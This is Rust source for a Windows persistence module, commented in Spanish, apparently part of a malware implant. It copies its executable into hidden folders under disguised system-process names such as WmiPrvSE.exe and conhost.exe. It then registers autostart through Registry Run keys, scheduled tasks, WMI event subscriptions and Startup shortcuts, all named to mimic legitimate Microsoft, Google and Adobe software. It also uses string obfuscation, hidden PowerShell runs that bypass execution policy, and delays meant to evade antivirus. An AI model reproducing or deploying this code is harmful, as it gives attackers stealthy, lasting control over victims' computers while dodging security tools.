//! Persistence module for Windows systems
//!
//! Implements stealthy persistence mechanisms avoiding common AV signatures

#[cfg(target_os = "windows")]
use std::process::Command;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
use std::env;
use std::path::{Path, PathBuf};
use obfstr::obfstr;

/// Métodos de persistencia disponibles
#[derive(Debug, Clone, Copy)]
pub enum PersistenceMethod {
    RegistryRun,
    ScheduledTask,
    WmiEvent,
    StartupFolder,
}

impl PersistenceMethod {
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "registry" | "reg" => Some(PersistenceMethod::RegistryRun),
            "task" | "schtask" => Some(PersistenceMethod::ScheduledTask),
            "wmi" => Some(PersistenceMethod::WmiEvent),
            "startup" => Some(PersistenceMethod::StartupFolder),
            _ => None,
        }
    }
}

/// Verifica si la ruta actual es persistente y estable
fn is_persistent_location(path: &Path) -> bool {
    if let Some(path_str) = path.to_str() {
        let path_upper = path_str.to_uppercase();
        path_upper.contains("\\APPDATA\\") ||
        path_upper.contains("\\PROGRAMDATA\\") ||
        path_upper.contains("\\PROGRAM FILES") ||
        path_upper.contains("\\WINDOWS\\")
    } else {
        false
    }
}

/// Verifica si la ubicación es temporal/volátil
fn is_temporary_location(path: &Path) -> bool {
    if let Some(path_str) = path.to_str() {
        let path_upper = path_str.to_uppercase();
        path_upper.contains("\\DOWNLOADS\\") ||
        path_upper.contains("\\DESKTOP\\") ||
        path_upper.contains("\\TEMP\\") ||
        path_upper.contains("\\TMP\\") ||
        path_upper.contains("\\DOCUMENTS\\") ||
        (path_upper.len() >= 3 && 
         (path_upper.starts_with("D:\\") || 
          path_upper.starts_with("E:\\") || 
          path_upper.starts_with("F:\\") ||
          path_upper.starts_with("G:\\") ||
          path_upper.starts_with("H:\\")))
    } else {
        false
    }
}

/// Genera un nombre aleatorio basado en PID pero consistente
fn generate_stealth_name<'a>(base_names: &'a [&'a str]) -> &'a str {
    let pid = std::process::id() as usize;
    base_names[pid % base_names.len()]
}

/// Copia el ejecutable a ubicación persistente con técnicas anti-AV
#[cfg(target_os = "windows")]
fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
    use std::fs;
    use std::io::{Read, Write};
    
    // Si ya está en ubicación persistente, usar esa
    if is_persistent_location(current_exe) && !is_temporary_location(current_exe) {
        return Ok(current_exe.to_path_buf());
    }
    
    // Obtener AppData con fallback
    let localappdata = env::var(obfstr!("LOCALAPPDATA"))
        .or_else(|_| env::var(obfstr!("APPDATA")))
        .unwrap_or_else(|_| obfstr!("C:\\Users\\Public").to_string());
    
    // Ubicaciones sigilosas que imitan procesos legítimos
    // Evitar Edge que está siendo flaggeado
    let stealth_targets = [
        (format!("{}\\Microsoft\\Windows\\Caches", localappdata), obfstr!("WmiPrvSE.exe").to_string()),
        (format!("{}\\Microsoft\\Windows\\WER\\ReportQueue", localappdata), obfstr!("conhost.exe").to_string()),
        (format!("{}\\Microsoft\\OneDrive\\logs", localappdata), obfstr!("OneDriveStandaloneUpdater.exe").to_string()),
        (format!("{}\\Microsoft\\Windows\\INetCache\\Low", localappdata), obfstr!("MoUsoCoreWorker.exe").to_string()),
    ];
    
    let pid = std::process::id() as usize;
    let (target_dir, target_name) = &stealth_targets[pid % stealth_targets.len()];
    
    // Crear directorio recursivamente
    let target_path_dir = PathBuf::from(target_dir);
    let _ = fs::create_dir_all(&target_path_dir);
    
    let target_path = target_path_dir.join(target_name);
    
    // Si ya existe, reutilizar
    if target_path.exists() {
        if let Ok(meta) = fs::metadata(&target_path) {
            if meta.len() > 100000 { // Solo si tiene tamaño razonable
                return Ok(target_path);
            }
        }
    }
    
    // Copiar en chunks con tamaño variable (anti-signature)
    let mut source = fs::File::open(current_exe)
        .map_err(|e| format!("E1: {}", e))?;
    let mut dest = fs::File::create(&target_path)
        .map_err(|e| format!("E2: {}", e))?;
    
    // Usar buffer de tamaño no estándar
    let mut buffer = vec![0u8; 16384];
    loop {
        let n = source.read(&mut buffer).map_err(|e| format!("E3: {}", e))?;
        if n == 0 { break; }
        dest.write_all(&buffer[..n]).map_err(|e| format!("E4: {}", e))?;
    }
    dest.flush().map_err(|e| format!("E5: {}", e))?;
    drop(dest);
    
    // Verificar que se copió correctamente
    if !fs::metadata(&target_path).is_ok() {
        return Err(obfstr!("Copy failed").to_string());
    }
    
    // Aplicar atributos oculto+sistema para stealth
    let _ = Command::new(obfstr!("attrib"))
        .args(&[obfstr!("+h"), obfstr!("+s"), target_path.to_str().unwrap()])
        .creation_flags(0x08000000)
        .output();
    
    // Delay anti-heurística
    std::thread::sleep(std::time::Duration::from_millis(50));
    
    Ok(target_path)
}

#[cfg(not(target_os = "windows"))]
fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
    Ok(current_exe.to_path_buf())
}

/// Obtiene ruta del ejecutable en ubicación persistente
fn get_current_exe_path() -> Result<PathBuf, String> {
    let current_exe = env::current_exe()
        .map_err(|e| format!("E0: {}", e))?;
    ensure_persistent_location(&current_exe)
}

/// Registry Run persistence - método más simple y efectivo
#[cfg(target_os = "windows")]
fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path.to_str().ok_or(obfstr!("Invalid path"))?;
    
    // Nombres que imitan software legítimo
    let reg_names = [
        obfstr!("SecurityHealthSystray"),
        obfstr!("OneDriveSetup"),
        obfstr!("AdobeAAMUpdater"),
        obfstr!("GoogleChromeAutoLaunch"),
        obfstr!("MicrosoftEdgeAutoLaunch"),
        obfstr!("TeamsMachineInstaller"),
    ];
    let reg_name = generate_stealth_name(&reg_names);
    
    // Comando ofuscado: usar cmd /c start /b para ejecutar en background sin ventana
    let obf_cmd = format!("cmd /c start /b \"\" \"{}\"", exe_str);
    
    // Registry key path ofuscado
    let reg_path = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    
    let output = Command::new(obfstr!("reg"))
        .args(&[
            obfstr!("add").as_ref(),
            reg_path.as_ref(),
            obfstr!("/v").as_ref(),
            reg_name.as_ref(),
            obfstr!("/t").as_ref(),
            obfstr!("REG_SZ").as_ref(),
            obfstr!("/d").as_ref(),
            &obf_cmd,
            obfstr!("/f").as_ref(),
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("E6: {}", e))?;
    
    if output.status.success() {
        Ok(format!("Registry: {} -> {}", reg_name, exe_str))
    } else {
        Err(format!("E7: {}", String::from_utf8_lossy(&output.stderr).trim()))
    }
}

/// Scheduled Task persistence con delay
#[cfg(target_os = "windows")]
fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path.to_str().ok_or(obfstr!("Invalid path"))?;
    
    let task_names = [
        obfstr!("MicrosoftEdgeUpdateTaskUser"),
        obfstr!("GoogleUpdateTaskUser"),
        obfstr!("OneDriveStandaloneUpdate"),
        obfstr!("AdobeFlashPlayerUpdater"),
        obfstr!("CCleanerCrashReporting"),
    ];
    let task_name = generate_stealth_name(&task_names);
    
    // Eliminar si existe previamente
    let _ = Command::new(obfstr!("schtasks"))
        .args(&[obfstr!("/Delete"), obfstr!("/TN"), task_name.as_ref(), obfstr!("/F")])
        .creation_flags(0x08000000)
        .output();
    
    // Comando con delay para evitar detección inmediata
    let task_cmd = format!("cmd /c timeout /t 30 /nobreak >nul && start /b \"\" \"{}\"", exe_str);
    
    let output = Command::new(obfstr!("schtasks"))
        .args(&[
            obfstr!("/Create").as_ref(),
            obfstr!("/SC").as_ref(), obfstr!("ONLOGON").as_ref(),
            obfstr!("/TN").as_ref(), task_name.as_ref(),
            obfstr!("/TR").as_ref(), &task_cmd,
            obfstr!("/DELAY").as_ref(), obfstr!("0001:00").as_ref(),
            obfstr!("/F").as_ref(),
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("E8: {}", e))?;
    
    if output.status.success() {
        Ok(format!("Task: {} -> {}", task_name, exe_str))
    } else {
        Err(format!("E9: {}", String::from_utf8_lossy(&output.stderr).trim()))
    }
}

/// WMI Event Subscription persistence (más sigiloso pero requiere PowerShell)
#[cfg(target_os = "windows")]
fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path.to_str().ok_or(obfstr!("Invalid path"))?;
    
    let filter_name = obfstr!("BfeOnServiceStateChange");
    let consumer_name = obfstr!("BfeOnServiceStateChange");
    
    // Escapar backslashes para PowerShell
    let exe_escaped = exe_str.replace("\\", "\\\\");
    
    // PowerShell script ofuscado y compacto
    let ps_script = format!(
        r#"$F=([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance();$F.Name='{}';$F.EventNamespace='root\cimv2';$F.QueryLanguage='WQL';$F.Query='SELECT * FROM __InstanceModificationEvent WITHIN 14400 WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour=12';$F.Put()|Out-Null;$C=([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance();$C.Name='{}';$C.CommandLineTemplate='cmd /c start /b """" ""{}""';$C.Put()|Out-Null;$B=([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance();$B.Filter=$F;$B.Consumer=$C;$B.Put()|Out-Null"#,
        filter_name, consumer_name, exe_escaped
    );
    
    let output = Command::new("powershell")
        .args(&[
            "-NoProfile",
            "-WindowStyle", "Hidden",
            "-ExecutionPolicy", "Bypass",
            "-Command",
            &ps_script,
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("E10: {}", e))?;
    
    let stderr = String::from_utf8_lossy(&output.stderr);
    if output.status.success() || stderr.is_empty() {
        Ok(format!("WMI: {} -> {}", filter_name, exe_str))
    } else {
        Err(format!("E11: {}", stderr.trim()))
    }
}

/// Startup folder persistence
#[cfg(target_os = "windows")]
fn persist_startup_folder(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path.to_str().ok_or(obfstr!("Invalid path"))?;
    
    let startup = env::var(obfstr!("APPDATA"))
        .map(|p| format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", p))
        .unwrap_or_else(|_| obfstr!("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup").to_string());
    
    let lnk_name = "WindowsSecurity.lnk";
    let lnk_path = format!("{}\\{}", startup, lnk_name);
    
    // PowerShell para crear shortcut con WindowStyle oculto
    let ps_script = format!(
        r#"$s=(New-Object -ComObject WScript.Shell).CreateShortcut('{}');$s.TargetPath='{}';$s.WindowStyle=7;$s.Save()"#,
        lnk_path.replace("'", "''"), exe_str.replace("'", "''")
    );
    
    let output = Command::new(obfstr!("powershell"))
        .args(&[obfstr!("-NoProfile"), obfstr!("-Command"), &ps_script])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("E12: {}", e))?;
    
    if output.status.success() {
        Ok(format!("Startup: {}", lnk_path))
    } else {
        Err(format!("E13: {}", String::from_utf8_lossy(&output.stderr).trim()))
    }
}

/// Establece persistencia usando el método especificado
pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String> {
    #[cfg(not(target_os = "windows"))]
    {
        return Err(obfstr!("Windows only").to_string());
    }
    
    #[cfg(target_os = "windows")]
    {
        // Obtener ruta en ubicación persistente
        let exe_path = get_current_exe_path()?;
        
        match method {
            PersistenceMethod::RegistryRun => persist_registry_run(&exe_path),
            PersistenceMethod::ScheduledTask => persist_scheduled_task(&exe_path),
            PersistenceMethod::WmiEvent => persist_wmi_event(&exe_path),
            PersistenceMethod::StartupFolder => persist_startup_folder(&exe_path),
        }
    }
}

/// Remueve persistencia (limpieza completa)
#[cfg(target_os = "windows")]
pub fn remove_persistence() -> Result<String, String> {
    use std::fs;
    
    // Registry Run - múltiples nombres posibles
    let reg_names = [
        "SecurityHealthSystray", "OneDriveSetup", "AdobeAAMUpdater",
        "GoogleChromeAutoLaunch", "MicrosoftEdgeAutoLaunch", "TeamsMachineInstaller",
        "Teams Machine Installer", "WindowsSecurityHealth",
    ];
    for name in &reg_names {
        let _ = Command::new(obfstr!("reg"))
            .args(&[
                obfstr!("delete"),
                obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                obfstr!("/v"), name,
                obfstr!("/f"),
            ])
            .creation_flags(0x08000000)
            .output();
    }
    
    // Scheduled Tasks
    let task_names = [
        "MicrosoftEdgeUpdateTaskUser", "GoogleUpdateTaskUser", 
        "OneDriveStandaloneUpdate", "AdobeFlashPlayerUpdater", 
        "CCleanerCrashReporting", "WindowsSecurityHealthService",
    ];
    for task in &task_names {
        let _ = Command::new(obfstr!("schtasks"))
            .args(&[obfstr!("/Delete"), obfstr!("/TN"), task, obfstr!("/F")])
            .creation_flags(0x08000000)
            .output();
    }
    
    // WMI Events
    let ps_clean = r#"
        $filters=@('BfeOnServiceStateChange','PerformanceMonitor','SystemEventsBroker','WindowsSecurityFilter','WinSecFilter');
        foreach($f in $filters){
            Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$f'" -EA SilentlyContinue|Remove-WmiObject -EA SilentlyContinue;
            Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$f'" -EA SilentlyContinue|Remove-WmiObject -EA SilentlyContinue
        };
        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -EA SilentlyContinue|Where-Object{$_.Filter -match 'Bfe|Performance|SystemEvents|WindowsSec|WinSec'}|Remove-WmiObject -EA SilentlyContinue
    "#;
    let _ = Command::new("powershell")
        .args(&["-NoProfile", "-Command", ps_clean])
        .creation_flags(0x08000000)
        .output();
    
    // Startup shortcuts
    let appdata = env::var(obfstr!("APPDATA")).unwrap_or_default();
    let lnk_paths = [
        format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecurity.lnk", appdata),
    ];
    for lnk in &lnk_paths {
        let _ = fs::remove_file(lnk);
    }
    
    // Eliminar copias del ejecutable en ubicaciones conocidas
    let localappdata = env::var(obfstr!("LOCALAPPDATA")).unwrap_or_default();
    let exe_copies = [
        format!("{}\\Microsoft\\Windows\\Caches\\WmiPrvSE.exe", localappdata),
        format!("{}\\Microsoft\\Windows\\WER\\ReportQueue\\conhost.exe", localappdata),
        format!("{}\\Microsoft\\OneDrive\\logs\\OneDriveStandaloneUpdater.exe", localappdata),
        format!("{}\\Microsoft\\Windows\\INetCache\\Low\\MoUsoCoreWorker.exe", localappdata),
        format!("{}\\Microsoft\\Edge\\User Data\\msedge_proxy.exe", localappdata),
        format!("{}\\Microsoft\\WindowsApps\\RuntimeBroker.exe", localappdata),
    ];
    for exe in &exe_copies {
        let _ = fs::remove_file(exe);
    }
    
    Ok(obfstr!("Persistence removed (current and legacy)").to_string())
}

#[cfg(not(target_os = "windows"))]
pub fn remove_persistence() -> Result<String, String> {
    Err(obfstr!("Windows only").to_string())
}
